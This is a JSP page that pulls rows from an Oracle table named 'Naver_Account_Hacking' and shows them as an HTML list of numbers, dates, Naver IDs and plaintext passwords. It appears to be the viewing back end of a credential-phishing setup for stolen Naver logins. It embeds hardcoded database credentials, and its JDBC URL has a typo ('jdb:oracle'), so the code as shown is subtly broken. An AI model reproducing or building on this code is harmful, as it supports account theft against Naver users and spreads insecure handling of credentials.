<%@page import="java.sql.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%
	ResultSet rs = null;
	PreparedStatement stmt = null;
	String sql = "";

	Class.forName("oracle.jdbc.driver.OracleDriver");

	String url = "jdb:oracle:thin:@localhost:1521:system";
	String id = "test20509";
	String pw = "20509";
	Connection conn = DriverManager.getConnection(url, id, pw);

	sql = "SELECT * FROM Naver_Account_Hacking ORDER BY num DESC";

	stmt = conn.prepareStatement(sql);
	
	rs = stmt.executeQuery();
%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>NAVER Account List</title>
<style type="text/css">
#border {
	border: 1px solid black;
	text-align: center;
}
</style>
</head>
<body>
	<table id="border">
		<thead>
			<tr>
				<th id="border">번호</th>
				<th id="border">날짜</th>
				<th id="border">아이디</th>
				<th id="border">비밀번호</th>
			</tr>
		</thead>
		<tbody>
			<%
				while (rs.next()) {
					int num = rs.getInt("num");
					String ndate = rs.getString("ndate");
					String Naver_id = rs.getString("id");
					String Naver_pw = rs.getString("pw");
			%>
			<tr>
				<td id="border"><%=num%></td>
				<td id="border"><%=ndate%></td>
				<td id="border"><%=Naver_id%></td>
				<td id="border"><%=Naver_pw%></td>
			</tr>
			<%
				}
			%>
		</tbody>
	</table>



</body>
</html>